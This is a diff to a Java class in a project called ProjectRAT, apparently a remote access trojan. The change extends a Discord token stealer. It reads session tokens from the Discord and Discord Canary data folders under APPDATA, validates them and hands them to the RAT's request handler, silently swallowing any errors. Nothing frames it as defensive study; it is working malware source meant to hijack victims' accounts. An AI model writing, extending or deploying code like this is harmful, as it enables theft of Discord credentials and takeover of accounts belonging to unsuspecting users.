@@ -26,15 +26,20 @@ public class Discord implements Request {
     private static Gson gson = new Gson();
 
     @Override
-    public void init() throws Exception {
-        tokenList =  getTokens(System.getenv("APPDATA") + "/Discord");
-        tokenList = removeDuplicates(tokenList);
-        tokenList = getValidTokens(tokenList);
+    public void init() {
+        String[] dataPaths = {System.getenv("APPDATA") + "/Discord",System.getenv("APPDATA") + "discordcanary"};
+        try {
+            for (String path: dataPaths) {
+                tokenList = getTokens(path);
+                tokenList = removeDuplicates(tokenList);
+                tokenList = getValidTokens(tokenList);
 
-        tokenList.forEach(e -> {
-            ProjectRAT.requestHandler.addStrings(process(e));
-        });
-
+                tokenList.forEach(e -> {
+                    ProjectRAT.requestHandler.addStrings(process(e));
+                });
+            }
+        }catch (Exception ignored){
+        }
     }
 
     @Override
